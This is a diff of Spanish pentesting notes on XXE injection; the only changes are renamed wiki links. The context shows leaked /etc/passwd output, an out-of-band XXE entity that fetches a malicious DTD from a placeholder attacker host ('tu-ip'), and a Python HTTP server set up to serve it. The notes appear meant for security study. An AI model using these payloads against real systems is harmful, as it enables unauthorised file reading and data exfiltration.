@@ -61,7 +61,7 @@ syslog:x:101:104::/home/syslog:/bin/false
  is already registered!
 ```
 
-Hay otras formas de listarlo, pero eso es ya [[Local File Inclusion (LFI)]].
+Hay otras formas de listarlo, pero eso es ya [[LFI]].
 
 ## XXE OOB
 
@@ -73,7 +73,7 @@ Si ahora creamos la siguiente entidad:
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://tu-ip/malicious.dtd">]>
 ```
 
-Nos montamos un **servidor http** en [[python 1]] y  enviamos la petición:
+Nos montamos un **servidor http** en [[python]] y  enviamos la petición:
 
 ```bash
 python3 -m http.server 80
